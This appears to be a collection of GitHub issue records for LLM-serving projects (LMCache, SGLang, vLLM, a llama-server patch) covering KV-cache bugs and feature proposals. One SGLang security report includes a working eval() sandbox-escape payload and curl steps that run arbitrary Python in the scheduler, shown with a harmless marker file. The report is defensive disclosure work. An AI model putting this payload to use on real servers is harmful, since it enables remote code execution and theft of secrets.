items.title: [Bug] fs L2 adapter: every store fails at os.open() in _write_with_odirect when use_odirect=true
items.author: h1manshu23
items.body_excerpt:
**Describe the bug**
With the `fs` L2 adapter and `use_odirect: true`, **every** chunk store fails. `FSL2Adapter._write_with_odirect` raises at the `os.open()` call, and each store is logged as failed:

```
[2026-07-31 12:39:27,361] LMCache ERROR: FSL2Adapter failed to store
/mnt/nvme0/-SEP-data-medium-SEP-text-generation-models-SEP-gemma-4-26B-A4B-it-FP8-dynamic-SEP-@0x01000100@1@246ba704d24a7690450504e0a607656c195b4e247501896d103d7d293f9b63dc.data
(fs_l2_adapter.py:629:lmcache.v1.distributed.l2_adapters.fs_l2_adapter)
```

Nothing is ever persisted to L2, so the disk tier is effectively dead while the server continues running and reporting no fatal error.

**This is not an unsupported-storage case.** `base_path=/mnt/nvme0` is a real block-backed filesystem on a 4-device NVMe RAID0 array:

```
md0 : active raid0 nvme3n2[3] nvme2n2[2] nvme1n2[1] nvme4n2[0]
```

Two distinct problems here:

1. **The failure itself.** O_DIRECT should be usable on this mount. Whatever LMCache passes to `os.open()` — flag combination, mode, or path — is being rejected on a filesystem/device stack that otherwise accepts direct I/O.
2. **The failure is undiagnosable and unrecoverable.** The log line prints the target path but not the underlying `OSError`/errno, so there's no way to tell EINVAL from EACCES from ENOENT without reading LMCache's source. And there is no fallback: rather than degrading to buffered I/O or refusing at startup, the adapter fails silently-but-endlessly, once per chunk, for the lifetime of the server.

Note the failure is at **`os.open()`**, not at the write — so this is not an O_DIRECT buffer/offset/length alignment issue, which would surface later in `_write_with_odirect`.

**To Reproduce**
Steps to reproduce the behavior:
1. `base_path` sits on a 4× NVMe md RAID0 (512k chunk) mounted at `/mnt/nvme0`.

2. Start the LMCache server with the `fs` L2 adapter and O_DIRECT enabled:

```bash
lmcache server --host localhost --port 9000 \
  --l1-size-gb 128 --eviction-policy LRU --chunk-size 256 \
  --l2-adapter '{"type": "fs", "base_path": "/mnt/nvme0", "use_odirect": true, "num_workers": 32}' \
  --http-port 8081
```

3. Start vLLM against it on a single GPU:

```bash
CUDA_VISIBLE_DEVICES=0 vllm serve /path/to/gemma-4-26B-A4B-it-FP8-dynamic/ \
  --port 9001 --gpu-memory-utilization 0.95 \
  --enable-prefix-caching --enable-chunked-prefill \
  --max-model-len 16384 \
  --kv-transfer-config '{"kv_connector":"LMCacheMPConnector","kv_role":"kv_both","kv_connector_extra_config":{"lmcache.mp.host":"tcp://localhost","lmcache.mp.port":9000}}' \
  --max-num-batched-tokens 8192 --max-num-seqs 12
```

4. Send any request. Every L2 store fails with the traceback below; `/mnt/nvme0` stays empty.

**Expected behavior**

On a direct-I/O-capable filesystem like this one, stores should succeed with `use_odirect: true` — that's the whole point of running the cache on NVMe RAID0.

Failing that, LMCache should:
- include the underlying errno / `OSError` message in the `failed to store` log line, and
- probe `O_DIRECT` support on `base_path` **once at startup**, then either fail fast with an actionable message or fall back to buffered I/O — instead of raising per-chunk for the lifetime of the process.

**Screenshots**
If applicable, add screenshots to help explain your problem.
```
[2026-08-02 14:09:16,887] LMCache ERROR: FSL2Adapter failed to store /mnt/nvme0/-SEP-data-medium-SEP-text-generation-models-SEP-gemma-4-26B-A4B-it-FP8-dynamic-SEP-@0x01000100@1@2fd0d18a24695cedc65b54957836c1ddcde16bfbe2208c8c8425e4fec9c93441.data (fs_l2_adapter.py:629:lmcache.v1.distributed.l2_adapters.fs_l2_adapter)

    await self._loop.run_in_executor(
  File "/usr/lib/python3.10/concurrent/futures/thread.py", line 58, in run
    result = self.fn(*self.args, **self.kwargs)
  File "/home/miphi/vllm_lib/lib/python3.10/site-packages/lmcache/v1/distributed/l2_adapters/fs_l2_adapter.py", line 563, in _write_with_odirect
```

items.title: [Bug][CLI] trace replay percentiles are one sample too high at whole ranks, so p90/p99 report the max
items.author: bharadwaj-pendyala
items.body_excerpt:
**Label**

`bug`, `cli`

**Describe the bug**

`_percentile()` in `lmcache/cli/commands/trace/_stats.py` treats the nearest-rank rank as a 0-based index, so it returns one sample too high whenever `pct/100 * N` lands on a whole number.

The docstring on the function says the p-th percentile is the sample at index `ceil(p/100 * N) - 1`. The code drops the `- 1`:

https://github.com/LMCache/LMCache/blob/3b8093cf8860a39d05937af915adfb5db493a047/lmcache/cli/commands/trace/_stats.py#L88-L95

`ceil(p/100 * N)` is a 1-based rank. Using it directly as a list index skips to the next sample.

The practical effect is that `lmcache trace replay` reports the slowest single sample as p90 or p99 at the sample counts you are most likely to hit. With 10 replayed calls for a qualname, p90 equals max. With 100, p99 equals max. Fractional ranks are unaffected, so the numbers look plausible and only the tail is wrong.

There is a second, smaller error in the same expression. `pct / 100.0` is inexact for most integer percentiles, so `(7 / 100.0) * 100` is `7.000000000000001` and `ceil()` picks rank 8. Multiplying before dividing keeps the product exact.

**To Reproduce**

Tested against `origin/dev` at commit `3b8093cf8860a39d05937af915adfb5db493a047`.

```python
from lmcache.cli.commands.trace._stats import ReplayStatsCollector, _percentile

vals = [float(i) for i in range(1, 101)]
print(_percentile(vals, 50))   # 51.0, want 50.0
print(_percentile(vals, 99))   # 100.0, want 99.0  (this is max)
print(_percentile(vals, 7))    # 8.0,   want 7.0   (the float rounding case)

s = ReplayStatsCollector()
for latency_ms in range(1, 11):
    s.record("op.foo", latency_ms / 1000.0)
stats = s.summary()["op.foo"]
print(stats.p90_ms, stats.max_ms)   # 10.0 10.0, want 9.0 10.0
```

Output on `dev`:

```
51.0
100.0
8.0
10.0 10.0
```

**Expected behavior**

Nearest-rank as documented: rank `ceil(p/100 * N)`, 1-based, so index `rank - 1`. p50 of 1..100 is 50, p99 is 99, p90 of ten samples is the ninth.

**Additional context**

The existing unit test encodes the off-by-one rather than catching it. `tests/cli/commands/trace/test_stats.py::TestPercentile::test_p50_on_100_values` asserts `51.0` with the comment `nearest-rank with floor((50/100)*100)=50 → index 50 → value 51`, which is where the 1-based rank got read as a 0-based index. That test needs updating alongside the fix.

Scope check on the two other percentile helpers in the CLI, neither of which should change here:

- `lmcache/cli/commands/bench/engine_bench/stats.py::_percentile` uses linear interpolation on purpose and is documented as such. Not the same method, not affected.
- `lmcache/cli/commands/bench/l2_adapter_bench/result.py` uses a `+0.999999` ceiling approximation. Different code, worth a separate look, out of scope for this.

The changed values are user visible: terminal output from `lmcache trace replay`, plus the `p50_ms`/`p90_ms`/`p99_ms` columns in the CSV and JSON exports.

I have a fix with regression tests ready and will open a PR against `dev` shortly. Happy to change direction if you would rather keep the current numbers and correct the docstring instead, though the tail numbers are wrong either way.

`lmcache query engine` falls back from `/v1/completions` to `/v1/chat/completions` after every `RuntimeError`, not only when the completions endpoint is unsupported.

Only retry via `/v1/chat/completions` when `/v1/completions` is unsupported. Authentication, transport, rate-limit, and server failures should be reported immediately.

## Scope

- Preserve fallback when the completions endpoint returns HTTP 404 or 405.
- Add regression coverage for non-compatibility failures and unsupported endpoints.

items.title: [Bug] L2 benchmark loses timeout accounting after warmup filtering
items.author: mohan-zeyu
items.body_excerpt:
**Describe the bug**

In commit `1fde7bec`, `_strip_warmup()` in `lmcache/cli/commands/bench/l2_adapter_bench/command.py` has two bugs:

1. **The `BenchResult` constructor omits `timed_out_rounds` (lines 615–624).** It defaults to `0`, discarding measurement timeout counts. Since `attempted_rounds = len(round_durations) + timed_out_rounds`, attempted rounds and total keys are undercounted, even with `warmup=0`.
2. **`round_durations[warmup:]` uses the wrong offset (line 620).** Durations contain only completed rounds. A warmup timeout adds no duration, so slicing by the number of warmup attempts removes a measurement duration. `success_counts[warmup:]` is correct because success counts include every attempt.

**To reproduce**

Run these two reproductions against the affected commit, `1fde7bec`.

**1. One timed-out attempt is reported as zero rounds**

```bash
lmcache bench l2 \
  --l2-adapter '{"type":"mock","max_size_gb":0.01,"mock_bandwidth_gb":0.000001}' \
  --only store \
  --num-keys 1 \
  --in-flight 1 \
  --data-size-kb 1024 \
  --rounds 1 \
  --warmup-rounds 0
```

The store times out after approximately 120 seconds. The summary drops that attempt:

| Field | Actual | Expected |
|---|---:|---:|
| Rounds | 0 | 1 |
| Rounds timed out | 0 | 1 |
| Total keys | 0 | 1 |

**2. A warmup timeout produces a 200% lookup hit rate**

This Python reproduction runs three lookup attempts: one warmup timeout, then two successful measurements. Completion notifications are mocked to avoid waiting for a real timeout.

```python
from unittest.mock import Mock, patch

from lmcache.cli.commands.bench.l2_adapter_bench.command import _strip_warmup
from lmcache.cli.commands.bench.l2_adapter_bench.data import make_object_keys
from lmcache.cli.commands.bench.l2_adapter_bench.runner import bench_lookup

adapter = Mock()
adapter.get_lookup_and_lock_event_fd.return_value = 0
adapter.submit_lookup_and_lock_task.side_effect = [0, 1, 2]
adapter.query_lookup_and_lock_result.side_effect = [
    Mock(popcount=Mock(return_value=1)),
    Mock(popcount=Mock(return_value=1)),
]

with patch(
    "lmcache.cli.commands.bench.l2_adapter_bench.runner.wait_eventfd",
    side_effect=[False, True, True],
):
    raw = bench_lookup(
        adapter,
        in_flight=1,
        num_keys=1,
        rounds=3,
        keys_for_round=lambda r: [make_object_keys(1, key_offset=r)],
        log=lambda message: None,
    )

result = _strip_warmup(raw, warmup=1)
print(result.total_success, result.total_keys, result.actual_hit_rate)
assert result.actual_hit_rate == 1.0
```

Actual output: `2 1 2.0` (200%); the assertion fails. Expected output: `2 2 1.0` (100%). The slice drops the first measurement duration but retains both measurement hit counts.

**Expected behavior**

Preserve measurement timeout counts in the returned `BenchResult`. Remove duration samples only for completed warmup rounds. Retain all measurement attempts and partial successes.

**Environment**

- OS: macOS 26.6.2, Apple Silicon (arm64)
- Python: 3.12.13
- PyTorch: 2.14.1; CUDA unavailable
- Affected LMCache commit: `1fde7bec`

items.title: Restart-proof KV cache for llama-server: 40K-token TTFT 155s to 6s after reboot
items.author: qqkzlm
items.body_excerpt:
Every restart wipes your prefill. Server crash, box reboot, model reload — a 40K-token agentic prompt pays the full ~155s prefill again before the first token.

I patched llama-server to persist KV-cache prefix checkpoints to disk and auto-restore the longest matching prefix on boot. Same prompt after a restart: **first token in ~6s instead of ~155s** (2.1s disk read once + decode). No client changes, no re-architecture — the server just remembers.

Measured on GTX 1080 8GB, Qwen3.6-35B-A3B, `-c 92160`:

- Cold: 151s prefill → first token at ~155s
- Warm (post-restart): 2.1s disk read (first request only) → first token at ~6s
- Checkpoints keyed by model + ctx + KV quant (wrong config = ignored, never corrupted); disk-budget eviction included

Single-commit patch (86KB): https://github.com/qqkzlm/llama-cpp-prompt-disk-cache — `git am` onto the PrismML `prism` branch, four flags (`--slot-save-path`, `--checkpoint-min-step`, `--ctx-checkpoints`, `--prompt-cache-disk-budget`).

One MoE lesson from the same box: keep experts on GPU, let KV follow the layers — pushing 20 MoE layers to CPU collapsed prefill 265→30 tok/s, which no cache can fix.

Happy to upstream behind a flag if maintainers are interested.

comments.body:
Update to the README since this went up — three things worth calling out for anyone trying it:

**1. Prebuilt CUDA binaries exist for both platforms.** The `v0.2.3` release ships `llama-server-win-cuda-v0.2.3.zip` and `llama-server-linux-cuda-v0.2.3.tar.gz`. The Linux package is built for `sm_61`/Pascal, so it also runs on GTX 10-series. No build needed:

```bash
./llama-server -m model.gguf -c 32768 --host 0.0.0.0 --port 8000 \
  --slot-save-path /var/tmp/kvstore/model \
  --prompt-cache-disk-budget 20 --checkpoint-min-step 2048 --ctx-checkpoints 64
```

**2. Only one flag is actually required.** `--slot-save-path` is the only one you must pass — `--prompt-cache-disk-budget` and `--prompt-cache-disk-path` are silently ignored without it, and entries land in `<slot-save-path>/pdcache`. `--prompt-cache-disk` is **enabled by default**, so passing it is optional; use `--no-prompt-cache-disk` to turn the cache off.

**3. Cache hits require a byte-identical prompt prefix.** Only the common prefix from token 0 onward is reused. If you prepend a timestamp or a random ID, everything after it misses and the cache is effectively unused. Put stable content first (system prompt, tool definitions, long docs) and per-turn content last — opencode / Claude Code already do this, so it works out of the box.

The README now has a "when does the cache hit / when does it miss" section covering this, a flag-duty table, and a Chinese-first three-step guide (the repo README is now Chinese-primary). A Windows `start-llama-server.bat` is included in the zip if you want a prompt-driven launcher instead of a command line.

Still happy to upstream this behind a flag if maintainers are interested — the whole feature is one commit touching `tools/server/server-prompt-disk.cpp` (~900 lines) plus slot/task integration.

items.title: [Feature] Integrate KVPress in order to try more KV cache optimization heuristics easily
items.author: vincentzed
items.body_excerpt:
# What is this?

In long context-serving instances, the KV cache can grow to a large size in `O(n)` complexity, and optimal compression can help us reach sub linear scaling of memory growth. KVPress library integrates many unique strategies to make it easier to try different heuristics for KV cache optimization in prefill.

# Background

KVPress provides a set of "presses" that compress the KV cache during the prefilling-phase. Each press is associated with a `compression_ratio` attribute that measures the compression of the cache. The easiest way to use a press is through our custom `KVPressTextGenerationPipeline`. It is automatically registered as a transformers pipeline with the name "kv-press-text-generation" when kvpress is imported and handles chat templates and tokenization for you:

Such a code example:

```python
from transformers import pipeline
from kvpress import ExpectedAttentionPress

device = "cuda:0"
model = "meta-llama/Llama-3.1-8B-Instruct"
model_kwargs = {"attn_implementation": "flash_attention_2"}
pipe = pipeline("kv-press-text-generation", model=model, device=device, model_kwargs=model_kwargs)

context = "A very long text you want to compress once and for all"
question = "\nA question about the compressed context"  # optional

press = ExpectedAttentionPress(compression_ratio=0.5)
answer = pipe(context, question=question, press=press)["answer"]
```

This compression is focused on the pre-fill phase, for example in prompt caching. 

# Design

The generic `BasePress` will use `compress` to return the compressed key and value tensor, with a lower sequence length dim. Some scores are based on heuristics to choose the KV pair with the lowest importance (there are 11 such presses so far). There are also other less straightforward methods of KV cache compression (I.e not the score based system above), which is part of the extensibility strategy we want to promote.

There is no quantization by default, but it can be enabled, with arbitrary precision. For now, Llama, Mistral, Phi, Qwen 2 and 3, and Gemma 3 are all tested.

It works with multiple GPUs, through the hugging face accelerate lib for the e2e inference.

[https://huggingface.co/docs/accelerate/en/index](https://huggingface.co/docs/accelerate/en/index)

In theory, it should be possible to use this in tandem with KV transfer backend. 

As a brief refresher, in tensor parallel, kvcache is sharded across a tension head, so each tpRank handles a subset, and in the disaggregated setup, the kvcache slice is transferred between prefill and decode.

See: python/sglang/srt/disaggregation/mooncake/conn.py

python/sglang/srt/layers/linear.py

In pipeline parallelism, the KV cache is distributed across layer. Each pipeline parallel stage handles specific layer range. And each has its distinct index from start to end layer, which is the logic to determine what layer each PP rank processes. Right now, we don't support pp on the decode side in PD moonncake backend.

Mooncake engine ref: python/sglang/srt/disaggregation/mooncake/conn.py

In data parallelism, each group has an independent KV cache replica. In this case, we can treat each KV cache separately and try to apply press on each of them independently. This would be a good place to start after the initial support.


https://github.com/NVIDIA/kvpress

https://github.com/sgl-project/sglang/issues/1347

# Success Criteria
One or more of the following will be possible. 
- [ ] You can run inference with KVPress on one node. 
- [ ] repeat the above step with any of the three parallelism strategies, maybe more than one 
- [ ] Make it work with PD and transfer(s) backend, but this is already covered by the point above.

Refreshed proposal for KVPress / sparse-attention work (refs #12607, #12933).

**Context.** The sparse-algorithm framework under `mem_cache/sparsity/` (`SparseCoordinator`, `QuestAlgorithm`, `FlashAttentionAdaptor`) is implemented but **not wired into serving** — `attention_begin/attention_end` have no callers, and `--enable-hisparse` only drives the separate DeepSeek/DSA host-offload path. **Proposal.** Start by **wiring the existing `QuestAlgorithm` into the non-MLA FlashAttention decode path** behind a default-off `--enable-sparse-attention` flag — turning the dormant framework into a tested, query-aware page-selection baseline (compute/bandwidth savings). Deliberately **no new algorithm** in this step (that was #12933's pitfall); SnapKV and others build on top.

**Status.** I have a working spike (validated on an RTX 4090, fa3, Qwen2.5-0.5B): it boots, runs end-to-end, output matches the dense baseline, and the decode selection path executes. items.title: [Bug] Dumper filter eval() enables scheduler-process RCE
items.author: JPengLi
items.body_excerpt:
### Checklist

- [x] I searched related issues but found no solution.
- [x] The bug persists in the latest version.
- [x] Issues without environment info and a minimal reproducible demo are hard to resolve and may receive no feedback.
- [x] If this is not a bug report but a general question, please start a discussion at https://github.com/sgl-project/sglang/discussions. Otherwise, it will be closed.
- [x] Please use English. Otherwise, it will be closed.

### Describe the bug

When the server runs with `DUMPER_SERVER_PORT=reuse`, `/dumper/{method}` is registered on the main model API and marked `ADMIN_OPTIONAL`. `/dumper/configure` passes the JSON body directly into the dumper configuration, including the string field `filter`.

During model execution, `_evaluate_filter` evaluates that string with Python `eval`:

```python
# python/sglang/srt/debug_utils/dumper.py:1312-1320
def _evaluate_filter(filter_expr: str, tags: dict[str, Any]) -> bool:
    namespace = _DefaultNoneDict(tags)
    namespace.update(_FILTER_BUILTINS)
    return bool(eval(filter_expr, {"__builtins__": {}}, namespace))
```

Although `__builtins__` is removed, `_FILTER_BUILTINS` exposes the function objects `re.search` and `re.match`. A Python function object has a `__globals__` attribute, which leads back to the module globals and the real builtins mapping. An attacker can therefore use `__import__` from `search.__globals__` and execute arbitrary Python code in the scheduler process.

### Reproduction

Launch an isolated server with the dumper control route enabled and with only an ordinary API key:

```bash
DUMPER_SERVER_PORT=reuse \
python3 -m sglang.launch_server \
  --model-path /models/Qwen2.5-0.5B-Instruct \
  --host 127.0.0.1 \
  --port 30200 \
  --api-key user-secret
```

Confirm that the authorization boundary distinguishes credentials:

```bash
curl -i -X POST http://127.0.0.1:30200/dumper/get_state \
  -H 'Authorization: Bearer wrong-secret' \
  -H 'Content-Type: application/json' -d '{}'
```

Observed:

```text
HTTP/1.1 401 Unauthorized
```

Using the ordinary API key succeeds:

```bash
curl -i -X POST http://127.0.0.1:30200/dumper/get_state \
  -H 'Authorization: Bearer user-secret' \
  -H 'Content-Type: application/json' -d '{}'
```

Observed:

```text
HTTP/1.1 200 OK
```

Configure a harmless marker-writing payload. It imports `pathlib` through the exposed function object, writes one file, and evaluates to False so no tensor dump is saved:

```bash
curl -sS -X POST http://127.0.0.1:30200/dumper/configure \
  -H 'Authorization: Bearer user-secret' \
  -H 'Content-Type: application/json' \
  -d '{
    "enable": true,
    "filter": "(search.__globals__['__builtins__']['__import__']('pathlib').Path('/tmp/sglang-dumper-marker').write_text('SGLANG_DUMPER_RCE') > 0) and False"
  }'
```

Trigger one model forward:

```bash
curl -sS -X POST http://127.0.0.1:30200/generate \
  -H 'Authorization: Bearer user-secret' \
  -H 'Content-Type: application/json' \
  -d '{
    "text": "trigger",
    "sampling_params": {"max_new_tokens": 1, "temperature": 0}
  }'
```

Observed:

```text
HTTP/1.1 200 OK
```

The scheduler process then created:

```text
/tmp/sglang-dumper-marker
```

with content:

```text
SGLANG_DUMPER_RCE
```

The configured filter can be reset with:

```bash
curl -sS -X POST http://127.0.0.1:30200/dumper/reset \
  -H 'Authorization: Bearer user-secret' \
  -H 'Content-Type: application/json' -d '{}'
```

### Evidence

Source on commit `51686cf8e7fee0ae773c5c9b8ede356507abef7b`:

```python
# python/sglang/srt/entrypoints/http_server.py:886-887
@app.api_route("/dumper/{method}", methods=["POST"])
@auth_level(AuthLevel.ADMIN_OPTIONAL)
```

```python
# python/sglang/srt/debug_utils/dumper.py:1307-1308
_FILTER_BUILTINS: dict[str, Any] = {"search": re.search, "match": re.match}
```

```python
return bool(eval(filter_expr, {"__builtins__": {}}, namespace))
```

Dynamic v0.5.19 observations:

```text
wrong bearer key /dumper/get_state   -> HTTP 401
ordinary key /dumper/get_state       -> HTTP 200
ordinary key /dumper/configure       -> HTTP 200
ordinary key /generate               -> HTTP 200
/tmp/sglang-dumper-marker            -> created by scheduler
```

Marker SHA-256 from the collected evidence:

```text
c045148ae95f16d70bf7666b6c1289a0b98bb0b4d9ea55f441b7da06a4fd94ea
```

An earlier run used a host-only path that did not exist inside the container. Its traceback still showed the same execution escaping to `pathlib.Path.write_text()`; the failure was only `FileNotFoundError` for that incorrect marker path. The corrected container path reproduced successfully without a crash.

### Impact


If `DUMPER_SERVER_PORT=reuse` is enabled and `admin_api_key` is absent, an ordinary API-key holder can execute arbitrary Python code in the scheduler process. With no API key configured, the same route is reachable without authentication.

- **Confidentiality: High.** Arbitrary code can read model files, mounted credentials, environment variables, process memory, and other data accessible to the scheduler.
- **Integrity: High.** Arbitrary code can modify files, runtime state, model state, or configuration and can establish persistence with the scheduler's permissions.
- **Availability: High.** Arbitrary code can terminate or crash the scheduler, corrupt runtime state, or exhaust CPU, GPU, memory, disk, or network resources.

Possible consequences include reading model files and environment secrets, modifying model state or files, opening network connections, terminating workers, or pivoting with the scheduler process's permissions. The empty-builtins argument is not a security sandbox because callable objects retain references to their defining globals.

Prerequisites:

- `DUMPER_SERVER_PORT=reuse`;
- access to `/dumper/configure` and `/generate`;
- no `admin_api_key`, or possession of the admin key;
- a subsequent model execution that reaches a dumper hook.

The filter should not be evaluated with `eval`. A structured parser

items.title: Handling KV Cache Corruption During L2-to-L1 Promotion in HiCache
items.author: montagetao
items.body_excerpt:
**Background**

HiCache supports hierarchical KV cache management, allowing cached data to be transferred from L2 (host memory) to L1 (GPU memory) when a cache hit occurs.

However, what happens if the KV cache data stored in L2 is already corrupted when it is promoted back to L1?

As far as I understand the current implementation, there does not appear to be an explicit data integrity validation mechanism in this path to detect such corruption before the data is reused. If corrupted KV cache data is loaded into L1 and used for inference, it could potentially lead to incorrect model outputs or other unexpected behavior.

**Discussion Points**

I'd like to discuss how HiCache should handle this scenario:

Data integrity validation: Should we introduce checksums or hashes to detect corruption when transferring KV cache data from L2 to L1? What would be the performance overhead?

Corruption handling: If corruption is detected, should we discard the corrupted cache entry and recompute the KV cache from the original tokens, rather than reusing invalid data?

Error propagation and recovery: How should the system handle corrupted entries during cache promotion? Should it fall back to a cache miss and continue inference, or report an error in certain cases?

Validation granularity: Should integrity checks be performed per token, per page, or per cache entry? Given HiCache's page-based management, would page-level checks provide a reasonable balance between reliability and overhead?

Performance considerations: How can we introduce integrity protection without significantly affecting cache-hit latency and overall inference throughput?

items.title: [Bug][Responses API] Zero-delta streaming items skip added/in_progress lifecycle events
items.author: mimran-khan
items.body_excerpt:
### Your current environment

Testing against `main`, CPU-only.

### Describe the bug

There's a known bug in `streaming_events.py` where items that complete with zero deltas never get their `response.output_item.added` or `response.output_item.done` events emitted. The code at line 614 already calls it out as a bug:

```python
if not state.sent_output_item_added and not state.is_first_function_call_delta:
    # Suppress done events for items had no delta and thus had no
    # added/in-progress lifecycle events. This is a bug.
    # TODO: Ensure added/in-progress events are emitted for zero-delta items.
    return []
```

There's also an xfail test for it at `test_serving_responses.py:644` that defines what the correct behavior should look like.

This comes up when a Harmony item resolves in the engine before any delta gets sent to the client. The item just vanishes from the SSE stream, which messes up any client tracking output items by lifecycle events.

### Expected behavior

Zero-delta items should still go through the full lifecycle: `added` then `done`. The xfail test covers text, function calls, code interpreter, and MCP tool item types.

Happy to take this on.

### Before submitting a new issue...

- [x] Make sure you already searched for relevant issues, and asked the chatbot living at the bottom right corner of the [documentation page](https://docs.vllm.ai/en/latest/), which can answer lots of frequently asked questions.

items.title: [Bug]: echo=true kills the stream with a ValidationError when the last message content is a list (multimodal content format) — non-streaming succeeds
items.author: abhay-codes07
items.body_excerpt:
### Your current environment

<details>
<summary>Environment</summary>

Pure-Python logic bug in the chat completions serving layer, reproducible on current `main` with a unit-level snippet — no GPU needed.

</details>

### 🐛 Describe the bug

With `"echo": true`, the streaming and non-streaming chat completion paths diverge when the last conversation message's `content` is a **list of text parts** — which is exactly what the chat template content format `"openai"` (used for multimodal models) produces.

The non-streaming generator flattens the list before echoing:

```python
if isinstance(last_msg_content, list):
    last_msg_content = "\n".join(msg["text"] for msg in last_msg_content)
```

The streaming generator has no such handling and passes the list straight into `DeltaMessage(content=last_msg_content)` — but `DeltaMessage.content` is `str | None`, so pydantic raises a `ValidationError`. The exception is swallowed by the stream's generic `except Exception` handler, so the client receives an **in-stream error chunk and a dead stream**, while the identical request with `"stream": false` succeeds and echoes the flattened text.

The streaming code even annotates the variable as `last_msg_content: str | list[dict[str, str]]`, documenting that the list case can occur, and then feeds it into the str-only field.

Reproducible by driving `chat_completion_stream_generator` directly (the pattern used in `tests/entrypoints/openai/chat_completion/test_serving_chat.py`) with `echo=true`, `add_generation_prompt=false`, and a conversation whose last message content is `[{"type": "text", "text": "..."}, ...]`: the stream yields `{"error": {...ValidationError...}}` instead of the echoed content.

Fix (PR incoming): apply the same list flattening in the streaming echo path so both paths behave identically.

items.title: [Feature]: Support auxiliary-GPU offloading for Qwen3.8-Flash-Next N-gram / PLE embeddings
items.author: sczhengyabin
items.body_excerpt:
### 🚀 The feature, motivation and pitch

## Motivation

Qwen3.8-Flash-Next introduces a very large N-gram / PLE embedding table.

This part of the model is particularly suitable for offloading because it is fundamentally a lookup workload rather than a large GEMM-heavy compute workload.

A useful deployment topology would be:

```text
Primary GPU
- Main model
- Attention / GDN
- MoE computation
- KV cache
- CUDA graphs

Auxiliary GPU
- N-gram / PLE embedding table
- N-gram lookup / gather
```

For example:

```text
GPU 0: RTX PRO 6000 96GB
       -> main NVFP4/FP8 model

GPU 1: 64GB accelerator
       -> ~51GB FP8 N-gram / PLE table
```

This is especially useful in heterogeneous systems where the second GPU is not suitable for Tensor Parallelism because it has:

* significantly lower compute performance;
* a different GPU architecture;
* limited peer-to-peer bandwidth;
* or no high-speed NVLink connection.

Such a GPU can still be very useful as a high-bandwidth embedding store.

## Why this should be different from Tensor Parallelism

The goal is **not** to include the auxiliary GPU in TP or EP.

The primary model should remain entirely on GPU 0.

Only the N-gram / PLE embedding table should reside on the auxiliary device.

Conceptually:

```text
token IDs
   |
   +----------------------------+
   |                            |
   |                     auxiliary GPU
   |                    n-gram ID / hash
   |                           |
Primary GPU               PLE lookup
Layer 0                       |
Layer 1                       |
   |                          |
   +-------- P2P copy <-------+
              |
           Layer 2+
```

Only the selected embedding vectors need to be transferred to the primary GPU.

The full PLE table never needs to move between GPUs during inference.

Therefore, decode-time communication volume should be very small compared with TP/EP communication.

## Proposed interface

Something along the lines of:

```bash
CUDA_VISIBLE_DEVICES=0,1 \
vllm serve Qwen/Qwen3.8-Flash-Next-FP8 \
    --tensor-parallel-size 1 \
    --ple-offload-device cuda:1
```

or:

```bash
--ngram-embedding-device cuda:1
```

More generally, it could be exposed as model-specific device placement:

```bash
--model-device-map '{
  "default": "cuda:0",
  "ple": "cuda:1"
}'
```

The exact API is not important; the important requirement is that the auxiliary GPU is **not treated as a TP rank**.

## Suggested implementation

Ideally:

1. Load the PLE / N-gram embedding weights directly onto the selected auxiliary GPU.

2. Compute N-gram indices on the auxiliary GPU or transfer only the small index tensor to it.

3. Perform embedding gather on the auxiliary GPU.

4. Asynchronously transfer the gathered embedding vectors back to the main GPU using CUDA P2P.

5. Use a separate CUDA stream and overlap this operation with early layers of the main model.

For example:

```text
Primary GPU:

embedding -> layer 0 -> layer 1 ------------> layer 2 / PLE fusion
██████████████████████████████████████████████████████████

Aux GPU:

ngram ids -> lookup -> gather -> P2P
██████████████████████████████
```

If the PLE result is ready before the layer that consumes it, the decode overhead could potentially be almost completely hidden.

## P2P fallback

It would also be useful to support systems where CUDA P2P is unavailable:

```text
Aux GPU
  ↓
Pinned host buffer
  ↓
Primary GPU
```

This would obviously be slower, but would still allow the auxiliary GPU to serve as an embedding-memory device.

## Prefill

Long-context prefill transfers much more embedding data than decode, so ideally the implementation could support:

* chunked PLE lookup;
* asynchronous gather;
* double buffering;
* overlap between PLE lookup/copy and main-model prefill.

For example:

```text
Aux GPU:
PLE chunk 1
        PLE chunk 2
                PLE chunk 3

Primary GPU:
        process chunk 1
                process chunk 2
                        process chunk 3
```

## Why this is useful beyond one specific GPU combination

This feature would allow users to reuse otherwise underutilized GPUs as high-bandwidth model-memory devices.

Example configurations include:

```text
Blackwell main GPU + Ampere auxiliary GPU
Hopper main GPU    + older datacenter GPU
96GB main GPU      + 48/64GB secondary GPU
fast GPU           + slower high-memory GPU
```

Unlike TP, heterogeneous compute performance is much less problematic because the auxiliary device only performs embedding lookup.

This could substantially expand the number of systems capable of serving Qwen3.8-Flash-Next without CPU PLE offload.

## Possible future extension: quantized PLE

It may also be useful to eventually support quantized PLE storage independently of the main model quantization, for example:

```text
FP8 PLE
INT8 PLE
INT4 / row-wise quantized PLE
```

Embedding lookup does not necessarily need to use the same quantization scheme as MoE GEMMs.

An auxiliary GPU could perform:

```text
INT4 PLE lookup
      ↓
dequantize selected rows
      ↓
BF16 / FP8 vectors
      ↓
P2P to primary GPU
```

However, GPU device placement alone would already be very useful and could be implemented independently of PLE quantization.

## Expected behavior

Ideally a user could run:

```text
Main model + KV + compute : cuda:0
N-gram / PLE table        : cuda:1
TP size                    : 1
```

without vLLM attempting to distribute transformer layers or MoE experts across both GPUs.

I think this architecture is particularly well suited to Qwen3.8-Flash-Next because the very large PLE table represents a large amount of model capacity but relatively little inter-device communication during autoregressive decoding.

Would the maintainers be interested in supporting this type of model-component-specific auxiliary GPU placement?

items.author: ruiwarn
items.body_excerpt:
### Current environment

- vLLM `0.26.1rc1.dev1104` (main branch, 2026-08-22 dev build). Also verified that no released version up to and including v0.28.0 (2026-08-26) contains a fix for this bug.
- Model: Qwen3.8-27B (FP8)
- Speculative decoding: DFlash drafter enabled
- `--tool-call-parser qwen3_coder`
- `--reasoning-parser qwen3`
- Client: `/v1/responses` with `stream: true` (via LiteLLM)

### 🐞 Describe the bug

In agentic (tool-heavy) workloads, the Responses API SSE stream aborts mid-stream with no terminal `response.*` event, leaving the client with an unclassifiable truncated stream. The failure is intermittent but recurrent.

### Error message

```
pydantic_core._pydantic_core.ValidationError: 1 validation error for ResponseFunctionToolCallItem
name
  Input should be a valid string [type=string_type, input_value=None, input_type=NoneType]
...
RuntimeError: Caught handled exception, but response already started.
```

### Root cause analysis

The crash occurs when a single engine step spans the end of a tool call and the start of the following reasoning/content segment — speculative decoding makes such multi-boundary steps common.

